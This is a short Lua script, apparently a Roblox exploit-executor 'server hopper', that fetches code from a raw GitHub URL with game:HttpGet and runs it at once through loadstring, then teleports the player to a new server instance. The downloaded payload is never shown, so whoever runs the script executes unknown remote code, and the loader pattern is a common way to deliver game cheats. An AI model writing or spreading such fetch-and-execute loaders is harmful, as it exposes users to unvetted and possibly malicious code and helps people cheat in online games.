-- Server Hopper Script to teleport player to a new instance after loading an external script
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local PLACE_ID = 109983668079237 -- The Place ID of your game

-- Function to execute the external script
local function loadExternalScriptAndTeleport()
    -- Step 1: Load the external script via HttpGet
    local externalScriptUrl = "https://raw.githubusercontent.com/Bant3r241/whatever/refs/heads/main/main.lua"
    local success, err = pcall(function()
        loadstring(game:HttpGet(externalScriptUrl))() -- Executes the external script
    end)

    if success then
        print("External script executed successfully.")
    else
        warn("Failed to execute external script: " .. err)
    end

    -- Step 2: Teleport to a new instance (new server) of the same game
    local teleportSuccess, teleportMessage = pcall(function()
        TeleportService:Teleport(PLACE_ID, player)
    end)

    if teleportSuccess then
        print("Successfully teleported to a new instance!")
    else
        warn("Teleport failed: " .. teleportMessage)
    end
end

-- Call the function to load the external script and teleport
loadExternalScriptAndTeleport()
